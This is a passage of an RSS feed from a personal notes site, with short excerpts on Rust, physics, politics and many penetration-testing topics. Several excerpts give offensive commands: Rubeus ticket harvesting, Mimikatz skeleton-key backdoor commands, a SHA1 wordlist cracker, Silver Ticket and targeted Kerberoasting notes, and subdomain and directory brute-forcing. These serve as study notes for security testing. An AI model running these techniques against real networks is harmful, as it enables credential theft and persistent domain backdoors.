      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/rubeus/</guid>
      <description>Rubeus Harvesting and Brute-forcing tickets Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.&#xA;GhostPack&#xA;Harvest TGTs every 30 seconds: Rubeus.exe harvest /interval:30 Password spray against found users and provide a .</description>
    </item>
    <item>
      <title>Rust - SHA1 Cracker</title>
      <link>https://kdbed.github.io/posts/sha1cracker/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/sha1cracker/</guid>
      <description>Implementing a sha1 hash cracker in Rust use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; fn main() -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn Error&amp;gt;&amp;gt; { let args: Vec&amp;lt;String&amp;gt; = env::args().collect(); if args.len() != 3 { println!(&amp;#34;Usage:&amp;#34;); println!(&amp;#34;sha1_cracker: &amp;lt;wordlist.txt&amp;gt; &amp;lt;sha1_hash&amp;gt;&amp;#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(&amp;#34;sha1 hash is not valid.&amp;#34;.into()); } let wordlist_file = File::open(&amp;amp;args[1])?; let reader = BufReader::new(&amp;amp;wordlist_file); for line in reader.</description>
    </item>
    <item>
      <title>Rust Programming</title>
      <link>https://kdbed.github.io/posts/rust_programming/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/rust_programming/</guid>
      <description>Basics Hello World // comment fn main() { // print text to console println!(&amp;#34;Hello World&amp;#34;); println!(&amp;#34;I&amp;#39;m a Rustacean!&amp;#34;); } Comments fn main(){ // line comment /* block comment * continued * ... */ let x = 5 + 90 + 5; println!(&amp;#34;Is `x` 10 or 100? x = {}&amp;#34;, x); } Formatted Print Printing is handled by a series of macros defined in std::fmt, some of which are:&#xA;format! : write formatted text to String print!</description>
    </item>
    <item>
      <title>S_MIME</title>
      <link>https://kdbed.github.io/posts/s_mime/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/s_mime/</guid>
      <description>S/MIME ComptTIA Security+ </description>
    </item>
    <item>
      <title>School Spending and Educational Outcomes</title>
      <link>https://kdbed.github.io/posts/school_spending_and_educational_outcomes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/school_spending_and_educational_outcomes/</guid>
      <description>Education spending and student learning outcomes DAVID EVANS|JANUARY 17, 2019 World Bank Blog Prior findings World Bank&amp;rsquo;s World Development Report 2004 showed little correlation between spending and access to school World Development Report 2018 shows a similarly weak correlation between spending and learning outcomes Vegas and Coffin, using a different econometric specification, do find a correlation between spending and learning outcomes up to US$8,000 per student annually. Does money matter? Yes.</description>
    </item>
    <item>
      <title>sha1</title>
      <link>https://kdbed.github.io/posts/sha1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/sha1/</guid>
      <description></description>
    </item>
    <item>
      <title>Silver Ticket</title>
      <link>https://kdbed.github.io/posts/silver_ticket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/silver_ticket/</guid>
      <description>Silver Ticket A Silver Ticket is a forged Kerberos Service Ticket (TGS) that allows access to a specific service without contacting a Domain Controller. It is created using the NTLM hash of the target service account, often a computer account (e.g., `HOST/`, `HTTP/`).&#xA;Overview Forged TGS for a specific service Does not require communication with a Domain Controller Uses the service account&amp;rsquo;s NTLM hash, not KRBTGT Lower privilege, more stealthy than a Golden Ticket Prerequisites SYSTEM or Administrator access on a domain-joined machine Knowledge of: NTLM hash of the target service account (e.</description>
    </item>
    <item>
      <title>Skeleton Key</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</guid>
      <description>Skeleton Key A Skeleton Key is a stealthy backdoor attack where Mimikatz injects a patch into LSASS memory on a Domain Controller. This allows an attacker to authenticate as any domain user using a master password, in addition to their real credentials.&#xA;Overview Injects code into `lsass.exe` on a Domain Controller Leaves legitimate logins untouched Adds a universal password valid for all domain accounts Memory-resident: disappears on reboot Prerequisites SYSTEM-level access on a Domain Controller Ability to execute code and patch LSASS memory Mimikatz or similar tool Key Concepts LSASS: Local Security Authority Subsystem Service; handles authentication Patch: Modifies Kerberos/NTLM authentication providers in memory Backdoor password: An additional universal password accepted for all users Mimikatz Commands Load Skeleton Key Patch mimikatz # privilege::debug mimikatz # misc::skeleton Default password: mimikatz</description>
    </item>
    <item>
      <title>SMB - Server Message Block</title>
      <link>https://kdbed.github.io/posts/smb_server_message_block/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/smb_server_message_block/</guid>
      <description></description>
    </item>
    <item>
      <title>SMTPS</title>
      <link>https://kdbed.github.io/posts/smtps/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/smtps/</guid>
      <description></description>
    </item>
    <item>
      <title>SNMP</title>
      <link>https://kdbed.github.io/posts/snmp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/snmp/</guid>
      <description>SNMP The SNMP Management Information Base (MIB) is a database containing information usually related to network management. The database is organized like a tree, with branches that represent different organizations or network functions. The leaves of the tree (or final endpoints) correspond to specific variable values that can then be accessed and probed by an external user.&#xA;Enumeration Nmap: sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt onesixtyone snmpcheck </description>
    </item>
    <item>
      <title>Spacetime</title>
      <link>https://kdbed.github.io/posts/spacetime/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/spacetime/</guid>
      <description>Spacetime Spacetime is a four-dimensional topological manifold with smooth atlas carrying a torsion-free connection compatible with a Lorentzian metric and a time orientation satisfying the Einstein equations.</description>
    </item>
    <item>
      <title>Splunk</title>
      <link>https://kdbed.github.io/posts/splunk/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/splunk/</guid>
      <description></description>
    </item>
    <item>
      <title>SQL Injection</title>
      <link>https://kdbed.github.io/posts/sql_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/sql_injection/</guid>
      <description>SQL Injection SQLi - websocket rayhan0x01 blind sql injection via websocket&#xA;From the above post&#xA;&amp;ldquo;If you didn&amp;rsquo;t know, the main difference between HTTP and WebSocket is that HTTP is built on a request-response model whereas WebSocket is like a Socket connection where both client and server can send data anytime asynchronously. So you can&amp;rsquo;t repeat the requests made in WebSocket as you would normally do for HTTP Requests in BurpSuite.</description>
    </item>
    <item>
      <title>Stack Canaries</title>
      <link>https://kdbed.github.io/posts/stack_canaries/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/stack_canaries/</guid>
      <description>https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/</description>
    </item>
    <item>
      <title>Subdomain Enumeration</title>
      <link>https://kdbed.github.io/posts/subdomainenumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/subdomainenumeration/</guid>
      <description>From DNS dig +nocmd trick.htb axfr +noall +answer @trick.htb WFuzz In case the subdomain has a certain naming convention (Trick/HTB):&#xA;sed &amp;#39;s/^/preprod-/&amp;#39; subdomains-top1million-110000.txt Then use wfuzz:&#xA;sudo wfuzz -c -f out -w wordlist -u &amp;#34;http://trick.htb&amp;#34; -H &amp;#34;Host: FUZZ.trick.htb&amp;#34; --hw 475 gobuster DNS 1 gobuster dns -d domain.com -w $wordlists/subdomains-top1million-110000.txt -t 20 vhost 1 gobuster vhost -u domain.com -w &amp;lt;wordlist&amp;gt; </description>
    </item>
    <item>
      <title>Targeted Kerberoast</title>
      <link>https://kdbed.github.io/posts/targeted_kerberoast/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/targeted_kerberoast/</guid>
      <description>Targeted Kerberoast targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print &amp;ldquo;kerberoast&amp;rdquo; hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the &amp;ldquo;kerberoast&amp;rdquo; hash, and delete the temporary SPN set for that operation. This is called targeted Kerberoasting. This tool can be used against all users of a domain, or supplied in a list, or one user supplied in the CLI.</description>
    </item>
    <item>
      <title>Testing</title>
      <link>https://kdbed.github.io/posts/testing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/testing/</guid>
      <description>test </description>
    </item>
    <item>
      <title>The Action Principle</title>
      <link>https://kdbed.github.io/posts/the_action_principle/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/the_action_principle/</guid>
      <description>The Action Principle Define the Lagrangian as the following combination of the kinetic energy \(T\) and the potential energy \(V\):&#xA;\[ L = T - V \]&#xA;\(L\) is a function of the coordinates \(x\) and the velocity \(\dot{x}\), which are treated as independent variables. For a point particle&#xA;\[ L(x,\dot{x}) = \frac{1}{2}m \sum_{i=1}^D (\dot{x}^i)^2 - V(x) \]&#xA;Taking derivatives&#xA;\begin{align*} \frac{\partial L}{\partial x^i} &amp;amp;= - \frac{\partial V}{\partial x^i} \\ \frac{\partial L}{\partial \dot{x}^i} &amp;amp;= m \dot{x}^i \end{align*}</description>
    </item>
    <item>
      <title>Tor</title>
      <link>https://kdbed.github.io/posts/tor/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/tor/</guid>
      <description>Tor oniux torproject</description>
    </item>
    <item>
      <title>Trump - Policies and Actions</title>
      <link>https://kdbed.github.io/posts/trump_policies_and_actions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/trump_policies_and_actions/</guid>
      <description>An analysis of the coherence &amp;ndash; or lack thereof &amp;ndash; of Trump&amp;rsquo;s policies and politics , along with general remarks on what he did while in office.&#xA;Changes in American Policy Many Americans will remember President Donald Trump&amp;rsquo;s presidency as a four-yearlong storm of tweets, rallies and on-air rants that ended in a mob riot and historic second impeachment. But there was more to the Trump presidency than attention-hogging political drama and conflict; often unnoticed, Trump and his administration actually did succeed in changing some of the ways Washington works.</description>
    </item>
    <item>
      <title>Underground Empire</title>
      <link>https://kdbed.github.io/posts/underground_empire/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/underground_empire/</guid>
      <description>Underground Empire Underground Empire - Henry Farrell, Abraham L. Newman </description>
    </item>
    <item>
      <title>Unredact Pixelized Text</title>
      <link>https://kdbed.github.io/posts/unredact_pixelized_text/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/unredact_pixelized_text/</guid>
      <description>Unredact Pixelized Text Unredactor BishopFox Depix Output the images from the pdf: pdfimages &amp;lt;pdf&amp;gt; &amp;lt;out&amp;gt;; then run depix:&#xA;1 2 3 python3 depix.py \\ -p test-000.ppm \\ -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png github spipm </description>
    </item>
    <item>
      <title>von Neumann Architecture</title>
      <link>https://kdbed.github.io/posts/von_neumann_architecture/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/von_neumann_architecture/</guid>
      <description>von Neumann Architecture </description>
    </item>
    <item>
      <title>Web Pentest - Browser Extensions</title>
      <link>https://kdbed.github.io/posts/web_pentest_browser_extensions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/web_pentest_browser_extensions/</guid>
      <description>wappalyzer Wappalyzer is a browser extension that uncovers the technologies used on websites. It detects content management systems, eCommerce platforms, web servers, JavaScript frameworks, analytics tools and many more.</description>
    </item>
    <item>
      <title>Web Pentest - Chrome Memory</title>
      <link>https://kdbed.github.io/posts/web_pentest_chrome_memory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/web_pentest_chrome_memory/</guid>
      <description>Chromium Memory https://www.cyberark.com/resources/threat-research-blog/extracting-clear-text-credentials-directly-from-chromium-s-memory https://www.cyberark.com/resources/threat-research-blog/go-blue-a-protection-plan-for-credentials-in-chromium-based-browsers%20</description>
    </item>
    <item>
      <title>Web Pentest - Cross-Site Scripting</title>
      <link>https://kdbed.github.io/posts/web_pentest_cross_site_scripting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/web_pentest_cross_site_scripting/</guid>
      <description>Cross-Site Scripting Stored XSS Stored (persistent) XSS attacks - the exploit payload is stored by a server &amp;ndash; in a DB or cached. The web app then fetches the payload and displays it to the vulnerable page&amp;rsquo;s visitors. Stored XSS vulnerabilities occur most often in forum software, eg in comment sections or in product reviews.&#xA;Reflected XSS Reflected XSS attacks usually include the payload in a crafted request or link. The web app takes the input and places it into the page content.</description>
    </item>
    <item>
      <title>Web Pentest - Enumeration</title>
      <link>https://kdbed.github.io/posts/web_pentest_enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/web_pentest_enumeration/</guid>
      <description>Web Application Enumeration Nmap 1 nmap -p80 --script=http-enum 192.168.1.2 Wappalyzer Determine technologies used &amp;ndash; see Browser Extensions&#xA;Directory Bruce Force Gobuster 1 gobuster dir -u 192.168.2.1 -w /usr/share/wordlists/dirb/common.txt -t 5 wfuzz Subdomain Enumeration dirb dirsearch 1 dirsearch -u &amp;lt;url&amp;gt; -x 404,403,400 feroxbuster 1 feroxbuster -u &amp;lt;url&amp;gt; </description>
    </item>
    <item>
      <title>Web Pentest - File Upload</title>
      <link>https://kdbed.github.io/posts/web_pentest_file_upload/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/web_pentest_file_upload/</guid>
      <description>File Upload Vulnerabilities Checklist from onsecurity Are filenames reflected back on the page? If so, are they HTML Entity encoded (XSS via file names)? Does it accept .zip files? Try a ZipSlip If it processes an image, check for Image Tragick (CVE-2016-3714) Can you bypass file type restrictions by changing the content-type value? Can you bypass file type restrictions by forging valid magic bytes? Can you upload a file with a less-common extension (such as .</description>
    </item>
    <item>
      <title>Web Pentest - Fuzzing</title>
      <link>https://kdbed.github.io/posts/web_pentest_fuzzing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/web_pentest_fuzzing/</guid>
      <description>Fuzzing ffuf Capture a request in Burpsuite, then copy as a curl command; use ffuf to fuzz:&#xA;1 ffuf -w /usr/share/wordlists/seclists/Fuzzing/... -u &amp;lt;url&amp;gt; &amp;lt;curl request&amp;gt; </description>
    </item>
    <item>
      <title>Web Pentest - JWT</title>
      <link>https://kdbed.github.io/posts/pentest_jwt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_jwt/</guid>
      <description>JWT Vulnerabilities jwt.io jwt_tool hacktricks - JWT Vulnerabilities </description>
    </item>
    <item>
      <title>Web Pentest - Spring</title>
      <link>https://kdbed.github.io/posts/web_pentest_spring/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/web_pentest_spring/</guid>
      <description>https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/</description>
    </item>
    <item>
      <title>Web Pentest - Tools</title>
      <link>https://kdbed.github.io/posts/web_pentest_tools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/web_pentest_tools/</guid>
      <description>Web Pentest Tools web brutator https://github.com/koutto/web-brutator https://blog.zufan.me/Web-Brutator/&#xA;yupysubdo https://github.com/0xYP/yupysubdo subdomain finder</description>
    </item>
    <item>
      <title>Web Pentest - Wordpress</title>
      <link>https://kdbed.github.io/posts/web_pentest_wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/web_pentest_wordpress/</guid>
      <description>Wordpress WPScan Enumerate vulnerable plugins, users, db exports:&#xA;wpscan --url &amp;lt;url&amp;gt; -e dbe,u,vp </description>
    </item>
    <item>
      <title>wfuzz</title>
      <link>https://kdbed.github.io/posts/wfuzz/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/wfuzz/</guid>
      <description></description>
    </item>
    <item>
      <title>Wildcard Certificate</title>
      <link>https://kdbed.github.io/posts/wildcard_certificate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/wildcard_certificate/</guid>
      <description>Wildcare Certificates digicert&#xA;What is a SSL Wildcard Certificate?&#xA;A SSL/TLS Wildcard certificate is a single certificate with a wildcard character (*) in the domain name field. This allows the certificate to secure multiple sub domain names (hosts) pertaining to the same base domain.&#xA;For example, a wildcard certificate for *.(domainname).com, could be used for www.(domainname).com, mail.(domainname).com, store.(domainname).com, in addition to any additional sub domain name in the (domainname).com.&#xA;When a client checks the sub domain name in this type of certificate, it uses a shell expansion procedure to see if it matches.</description>
    </item>
    <item>
      <title>Windows - Cached Credentials as SYSTEM</title>
      <link>https://kdbed.github.io/posts/windows_cached_credentials_as_system/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/windows_cached_credentials_as_system/</guid>
      <description>Credentials cached as SYSTEM Cached Passwords - SYSTEM&#xA;There are passwords that can be stored in the SYSTEM context that can&amp;rsquo;t be seen in the normal Credential Manager view.&#xA;Download PsExec.exe from Technet and copy it to C:\Windows\System32.&#xA;From a command prompt run: psexec -i -s -d cmd.exe.&#xA;From the new DOS window run: rundll32 keymgr.dll,KRShowKeyMgr&#xA;Remove any items that appear in the list of Stored User Names and Passwords. Restart the computer.</description>
    </item>
    <item>
      <title>Windows - Security Fundamentals</title>
      <link>https://kdbed.github.io/posts/windows_security_fundamentals/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/windows_security_fundamentals/</guid>
      <description>Windows Security PowerShell script execution policy - determines what types of scripts PowerShell can execute. For Windows clients running PowerShell 5.1, the default is Restricted, which blocks all scripts from running unless they are signed with a trusted certificate. Change the execution policy to RemoteSigned - this execution policy allows the user to run unsigned PowerShell scripts if they’re created locally but will not allow us to execute unsigned scripts downloaded in a web browser or attached to emails.</description>
    </item>
    <item>
      <title>Windows - Trusted Platform Module (TPM)</title>
      <link>https://kdbed.github.io/posts/windows_trusted_platform_module_tpm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/windows_trusted_platform_module_tpm/</guid>
      <description>Trusted Platform Module A Trusted Platform Module (TPM) is a specialized chip on your computer&amp;rsquo;s motherboard designed to enhance security by securely storing cryptographic keys used for encryption and decryption. It ensures that your operating system and firmware are authentic and have not been tampered with. TPMs can be implemented as discrete chips, which are separate components on the motherboard, or as integrated solutions within the main processor.&#xA;For example, the Microsoft Pluton security processor is an integrated solution that embeds TPM functionality directly into the CPU.</description>
    </item>
    <item>
      <title>Windows Kernel - Object Manager</title>
      <link>https://kdbed.github.io/posts/windows_kernel_object_manager/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/windows_kernel_object_manager/</guid>
      <description>Windows Kernel - Object Manager </description>
    </item>
    <item>
      <title>Windows Kernel - Security Reference Monitor</title>
      <link>https://kdbed.github.io/posts/windows_kernel_security_reference_monitor/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/windows_kernel_security_reference_monitor/</guid>
      <description>Windows Kernel - Security Reference Monitor The Security Reference Monitor (SRM) implements the security mechanisms that restrict which users can access different resources.</description>
    </item>
    <item>
      <title>Windows Kernel API Prefix-to-Subsystem Mapping</title>
      <link>https://kdbed.github.io/posts/windows_kernel/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/windows_kernel/</guid>
      <description>The Windows Kernel There are two parts of the running operating system: the kernel and the user-mode applications. The kernel makes the security decisions that determine what a user can do on the system. Most of the applications you use on a Windows machine run in user mode.&#xA;The Windows NTOS kernel executive The kernel provides all the OS&amp;rsquo;s privileged functionality, as well as interfaces through which user applications can communicate with the hardware.</description>
    </item>
    <item>
      <title>X11 Authorization</title>
      <link>https://kdbed.github.io/posts/x11_authorization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/x11_authorization/</guid>
      <description>X11 Authorization https://stackoverflow.com/questions/37157097/how-does-x11-authorization-work-mit-magic-cookie/37367518#37367518&#xA;Well, first of all there is a file ~/.Xauthority on the machine. Notice that (usually on machine with GUI) wrong permissions of this file, can cause a login screen loop&amp;hellip; (took me hours to understand that).&#xA;As you mentioned there are 5 mechanisms:&#xA;Host access: the server has host access list (if a network address exists in this list, the connection is permitted). the list is managed using xhost command.</description>
    </item>
    <item>
      <title>XOR                                                         #cryptography</title>
      <link>https://kdbed.github.io/posts/xor_cryptography/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/xor_cryptography/</guid>
      <description>XOR Basics crypto101&#xA;Exclusive or &amp;ndash; &amp;lsquo;XOR&amp;rsquo; &amp;ndash; is a Boolean binary operator that is true when either the first input or the second input, but not both, are true.&#xA;XOR is a &amp;lsquo;programmable inverter&amp;rsquo;: one input bit decides whether to invert the other input bit or to just pass it through unchanged. &amp;lsquo;Inverting&amp;rsquo; bits is also called &amp;lsquo;flipping&amp;rsquo; bits.&#xA;Inputs and outputs above are named as if XOR were being used as an encryption operation, with plaintext bit, key bit, ciphertext bit.</description>
    </item>
    <item>
      <title>Z3 Basics</title>
      <link>https://kdbed.github.io/posts/z3_basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/z3_basics/</guid>
      <description></description>
    </item>
    <item>
      <title>Zero-knowledge proofs</title>
      <link>https://kdbed.github.io/posts/zero_knowledge_proofs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/zero_knowledge_proofs/</guid>
      <description>Zero-knowledge proofs Background A zero-knowledge proof (ZKP) is a method of proving the validity of a statement without revealing anything other than the validity of the statement itself. It is a proof system with a prover, a verifier, and a challenge that gives users the ability to publicly share a proof of knowledge or ownership without revealing the details of it.&#xA;First appeared in this Zero Knowledge paper by Shafi Goldwasser, Silvio Micali, and Charles Rackoff:</description>
    </item>
  </channel>
</rss>
